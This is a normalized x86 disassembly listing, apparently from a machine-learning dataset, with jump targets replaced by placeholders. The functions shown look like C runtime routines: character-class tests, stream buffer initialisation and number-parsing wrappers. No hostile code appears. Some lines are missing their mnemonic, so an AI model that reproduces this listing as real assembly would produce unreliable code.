mov edi eax
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
xor eax eax
cmp edi esi
sete al
jmp r-xdata
push 0x2
push edi
push edi
push edx
call sub_43ed48
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov al 0x1
jmp r-xdata
test [ eax + 0x28 ] 0x20
je r-xdata
sub_432ec0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_4321dd
push eax
call sub_43e954
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
push edi
push 0x1
call sub_41739e
pop ecx
push 0x2
pop ebx
cmp esi eax
jne r-xdata
xor al al
jmp r-xdata
push ebx
call sub_41739e
pop ecx
cmp esi eax
jne r-xdata
mov edi rw-data
jmp r-xdata
pop esi
pop ebp
retn
xor al al
mov edi rw-data
inc [ rw-data ]
lea ecx [ esi + 0xc ]
mov eax [ ecx ]
test eax 0x4c0
jne r-xdata
mov eax 0x282
[ ecx ] eax
mov eax [ edi ]
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x8 ] 0x1000
mov [ esi + 0x18 ] 0x1000
push 0x1000
call sub_42d3eb
push 0x0
mov [ edi ] eax
call sub_42d3b1
mov eax [ edi ]
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
lea ecx [ esi + 0x14 ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_432f75
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0x9
test al 0x1
je r-xdata
pop edi
pop esi
push esi
call sub_4310fe
pop ecx
mov eax 0xfffffd7f
[ edi ] eax
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
sub_432fd6
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
movzx eax bl
push eax
call sub_433324
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
cmp bl 0x5f
jne r-xdata
pop ebx
pop ebp
retn
sub_432ff8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_433353
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_433024
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43305f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43309a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push [ ebp + 0xc ]
call sub_41cbf0
cmp [ ebp + 0x8 ] 0x9
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x40
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
push 0x40
pop eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4330dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433115
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433024
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_433138
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43305f
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43315b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433193
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x117
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4331ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433206
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x157
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433241
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x10
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433279
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4332b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4332e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
lea eax [ ebp - 0xc ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433324
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433024
pop ecx
pop ecx
pop ebp
retn
sub_433353
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_43305f
pop ecx
pop ecx
pop ebp
retn
sub_433382
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x9
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43309a
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x40
pop ebp
retn
push 0x40
pop eax
pop ebp
retn
sub_4333b9
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x20
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4330dd
pop ecx
pop ecx
pop ebp
retn
sub_4333e6
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_43315b
pop ecx
pop ecx
pop ebp
retn
sub_433413
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x117
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433193
pop ecx
pop ecx
pop ebp
retn
sub_433442
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4331ce
pop ecx
pop ecx
pop ebp
retn
sub_43346f
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x157
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433206
pop ecx
pop ecx
pop ebp
retn
sub_43349e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x10
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433241
pop ecx
pop ecx
pop ebp
retn
sub_4334cb
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433279
pop ecx
pop ecx
pop ebp
retn
sub_4334f8
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4332b1
pop ecx
pop ecx
pop ebp
retn
sub_433525
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4332e9
pop ecx
pop ecx
pop ebp
retn
sub_433554
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x10 ]
call sub_41cbf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
xor eax eax
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x2 ] al
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call sub_4337e8
pop ecx
pop ecx
test al al
je r-xdata
call sub_430f56
xor ecx ecx
mov [ eax ] 0x2a
xor eax eax
mov [ ebp - 0x4 ] bl
inc ecx
mov [ ebp - 0x3 ] al
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp - 0xc ] eax
push ecx
movzx eax al
push eax
call sub_43ef62
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x98 ]
movzx ecx [ eax + ebx ]
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x10 ] al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] al
xor eax eax
push 0x2
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] al
pop ecx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x8 ] ax
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_43f42d
add esp 0x24
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
jmp r-xdata
sub_43369e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x10 ]
call sub_41cbf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
xor eax eax
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x2 ] al
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call sub_433805
pop ecx
pop ecx
test al al
je r-xdata
call sub_430f56
xor ecx ecx
mov [ eax ] 0x2a
xor eax eax
mov [ ebp - 0x4 ] bl
inc ecx
mov [ ebp - 0x3 ] al
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp - 0xc ] eax
push ecx
movzx eax al
push eax
call sub_43ef62
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x10 ] al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] al
xor eax eax
push 0x2
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] al
pop ecx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x8 ] ax
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_43f42d
add esp 0x24
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
jmp r-xdata
sub_4337e8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x2
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_433805
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_42ee35
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_4338a2
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_433861
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_4338d2
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x61 ]
cmp eax 0x19
ja r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_433888
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
mov eax ecx
pop ebp
retn
add ecx 0xffffffe0
sub_433902
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_43391d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_433938
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433965
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433992
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4339bf
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4339ec
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433a19
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433a46
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433a73
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433aa0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433acc
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433af9
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433b26
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433b53
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433b80
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433bac
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433bd9
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c06
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c33
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c60
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c8c
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433cb9
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433ce6
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d13
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d40
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d6c
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d99
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433dc6
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433df3
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433e20
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42deb3
